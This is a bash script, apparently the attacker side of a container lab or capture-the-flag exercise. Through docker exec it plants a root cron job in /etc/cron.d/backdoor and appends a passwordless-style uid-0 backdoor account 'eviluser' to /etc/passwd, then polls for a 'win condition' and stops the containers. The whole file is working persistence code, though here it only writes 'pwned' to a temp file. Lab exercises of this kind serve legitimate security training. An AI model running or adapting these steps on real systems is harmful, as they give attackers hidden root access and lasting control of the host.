#!/bin/bash
set -e

# Variables
BACKDOOR_USER=eviluser
BACKDOOR_PASS=evilpass
CRON_PATH=/etc/cron.d/backdoor
PASSWD_PATH=/etc/passwd
TARGET_CONTAINER=target  # <-- Change this if your target container has a different name

# Add cronjob and backdoor user to the target container
docker exec $TARGET_CONTAINER sh -c "echo '* * * * * root echo pwned > /tmp/pwned-lab' > $CRON_PATH"
docker exec $TARGET_CONTAINER sh -c "echo '$BACKDOOR_USER:x:0:0:root:/root:/bin/sh' >> $PASSWD_PATH"
echo "[+] Backdoor cronjob and user added to $TARGET_CONTAINER."

# Win condition check loop
echo "[+] Waiting for win condition..."
for i in {1..30}; do
  WIN=1
  # Check cronjob
  docker exec $TARGET_CONTAINER sh -c "grep -q '\* \* \* \* \* root echo pwned > /tmp/pwned-lab' /etc/cron.d/backdoor" || WIN=0
  # Check backdoor user
  docker exec $TARGET_CONTAINER sh -c "grep -q '^$BACKDOOR_USER:x:0:0:' /etc/passwd" || WIN=0
  # Check /tmp/pwned-lab content
  docker exec $TARGET_CONTAINER sh -c "grep -q '^pwned$' /tmp/pwned-lab" || WIN=0
  if [ $WIN -eq 1 ]; then
    echo "\n*** WIN: All backdoors are in place and cron has executed! ***"
    echo "[+] Shutting down containers..."
    docker stop $TARGET_CONTAINER || true
    # Try to get this container's name and stop itself
    SELF_NAME=$(hostname)
    docker stop $SELF_NAME || true
    exit 0
  fi
  sleep 2
done

echo "[!] Win condition not met after timeout."

# Optionally, keep attacker container alive for inspection
sleep infinity 